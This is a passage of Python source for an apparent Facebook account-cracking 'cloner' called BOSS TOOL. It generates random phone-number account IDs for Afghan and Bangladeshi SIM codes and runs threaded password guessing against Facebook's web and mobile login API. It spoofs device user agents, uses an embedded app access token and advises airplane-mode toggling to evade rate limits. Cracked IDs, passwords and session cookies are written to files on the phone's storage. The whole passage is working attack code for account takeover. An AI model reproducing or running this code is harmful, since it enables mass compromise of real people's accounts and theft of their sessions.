                        limit = int(input('\t\x1b[1;92m        UIDS LIMIT MENU\n\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as BOSS:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   BOSS TOOL RANDOM AFG CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        print('\033[0;97m[•]\x1b[1;92m BOSS TOOL CRACKING HAS BEEN STARTED')
                        linex() 
                        print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123','baloch','afghan','afghan12345','afghan123','afghan1234','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
                                BOSS.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                linex()
                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear()
                menu()                
#_________[ BD RANDOM CLONER ]______>> 
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mBOSS TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
                print('\t\x1b[1;92m      BANGLADESH  SIM CODE MENU')
                linex()
                print('\033[1;32m BANGLADESH SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m016,017,018,019')
                linex()
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m')
                clear()
                try:
                        limit = int(input('\t\x1b[1;92m        UIDS LIMIT MENU\n\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as BOSS:     
                        clear()
                        tl = str(len(user))
                        print('      \x1b[1;92mBOSS TOOL RANDOM BANGLADESH CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        print('\033[0;97m[•]\x1b[1;92m BOSS TOOL CRACKING HAS BEEN STARTED')
                        linex() 
                        print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                BOSS.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                linex()
                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear()
                menu() 
#_________[ METHOD 1 ]______>>  
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mBOSS-M1\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['Infinix_X521','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['414.0.0.30.113','414.0.0.30.113','354.0.0.8.108','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','414.0.0.30.113','413.0.0.30.104','414.0.0.30.113','408.1.0.16.113'])
                        ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+str(random.randint(000000000,999999999))+';FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/'+fbcr+';FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'       
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        BOSS=session.cookies.get_dict().keys()
                        if "c_user" in BOSS:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m[\033[0;97mBOSS-OK\033[0;92m] \033[0;92m%s \033[0;97m| \033[0;92m%s'%(ids,pas))
                                open('/sdcard/BOSS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/BOSS-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in BOSS:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                        open('/sdcard/BOSS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#_________[ METHOD 2 ]______>>  
def api(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mBOSS-M2\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                                model = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
                                ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1406};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\33[1;92m[\033[0;97mBOSS-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/BOSS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/BOSS-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\33[1;97m[\033[1;92mBOSS-2F\033[1;97m]\033[1;92m '+ids+' | '+pas)
                                                twf.append(ids)
                                                break                   
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                open('/sdcard/BOSS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ METHOD 3 ]______>>  
def api1(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mBOSS-M3\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                model = random.choice(['Infinix_X521','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                                fbap = random.choice(['414.0.0.30.113','414.0.0.30.113','354.0.0.8.108','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','414.0.0.30.113','413.0.0.30.104','414.0.0.30.113','408.1.0.16.113'])
                                ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1280};FBLC/'+fblc+';FBCR/'+fbcr+';FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\r\x1b[1;92m[\033[0;97mBOSS-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/BOSS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/BOSS-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;96mBOSS-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
                                                twf.append(ids)
                                                break           
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                open('/sdcard/BOSS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ METHOD RANDOM CLONING ]______>>  
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mBOSS-CRACKING\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                                model = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
                                ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1406};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+';FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}#'Mozilla/5.0 (Linux; Android 10; CPH2121 Build/RP1A.200720.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/358.0.0.34.117;]'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/BOSS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                        print('\r\r\x1b[1;92m[\033[0;97mBOSS-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                        #print("Cookie: "+coki)
                                                        open('/sdcard/BOSS-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        open('/sdcard/BOSS-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
                                                open('/sdcard/BOSS-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ NETWORK ERROR ]______>>  
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n\033[0;97m[•]\033[1;31m NO INTERNET CONNECTION...')
        exit()
except Exception as e:pass
menu()